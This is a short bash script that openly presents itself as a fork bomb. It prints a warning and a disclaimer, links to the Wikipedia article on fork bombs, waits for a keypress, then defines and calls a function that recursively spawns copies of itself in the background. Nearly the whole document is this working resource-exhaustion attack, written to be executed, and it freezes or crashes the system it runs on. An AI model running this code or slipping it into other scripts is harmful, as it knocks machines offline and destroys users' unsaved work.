#!/bin/bash

echo "This program can damage this system."
echo "I'm in no way responsible for any form of damage" 
echo "Please read https://en.wikipedia.org/wiki/Fork_bomb for more informations"
read

echo "Executing fork bomb.."

fork() {
    fork | fork &
}

fork
